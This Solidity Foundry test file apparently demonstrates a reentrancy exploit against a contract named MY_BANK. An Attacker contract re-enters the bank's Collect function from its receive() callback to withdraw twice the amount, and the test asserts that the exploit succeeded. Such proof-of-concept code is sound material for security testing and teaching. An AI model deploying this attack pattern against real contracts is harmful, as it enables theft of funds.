
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    using stdStorage for StdStorage;

    MY_BANK public bank;
    Log public logFile;

    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        bank = new MY_BANK(address(logFile));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        vm.warp(1 days);
        stdstore
            .target(address(bank))
            .sig(MY_BANK.Acc.selector)
            .with_key(address(_attacker))
            .depth(0)
            .checked_write(block.timestamp - 1);
        stdstore
            .target(address(bank))
            .sig(MY_BANK.Acc.selector)
            .with_key(address(_attacker))
            .depth(1)
            .checked_write(attackVal * 2);

        // --- 3. Funding ---
        
        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public bank;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 storedVal;

    constructor(address victimAddress) { 
        bank = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
    }

    function attack(uint256 val) public {
        uint256 initialETH = address(this).balance;

        storedVal = val;

        bank.Collect(val);

        uint256 finalETH = address(this).balance;
        if (finalETH == initialETH + 2 * val && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            
            attackCallCount++;
            bank.Collect(storedVal);
        }
    }
}
